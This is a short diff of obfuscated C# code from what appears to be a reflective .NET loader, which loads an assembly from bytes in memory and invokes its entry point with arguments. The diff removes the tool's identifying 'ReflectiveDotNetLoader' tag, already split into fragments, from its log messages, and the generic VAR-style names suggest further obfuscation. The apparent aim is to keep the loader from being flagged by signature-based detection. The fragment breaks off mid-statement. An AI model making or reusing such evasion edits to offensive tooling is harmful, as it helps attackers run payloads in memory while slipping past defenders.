@@ -516,10 +516,10 @@ namespace VAR1
 
             Assembly VAR128 = Assembly.Load(VAR124);
             MethodInfo VAR129 = VAR128.EntryPoint;
-            VAR132.Append("[Ref"+"lect"+"iveD"+"otN"+"et"+"Loader] EntryPoint is " + VAR129 + Environment.NewLine);
+            VAR132.Append("EntryPoint is " + VAR129 + Environment.NewLine);
             if (VAR129 != null)
             {
-                VAR132.Append("[Ref" + "lect" + "iveD" + "otN" + "et" + "Loader] Passing args: " + String.Join(" ", VAR127) + Environment.NewLine);
+                VAR132.Append("Passing args: " + String.Join(" ", VAR127) + Environment.NewLine);
                 object VAR12 = VAR128.CreateInstance(VAR129.Name);
                 List<string> VAR130 = new List<string>(VAR127);
                 VAR129.Invoke(null, new[] { (object[]) VAR130.ToArray()
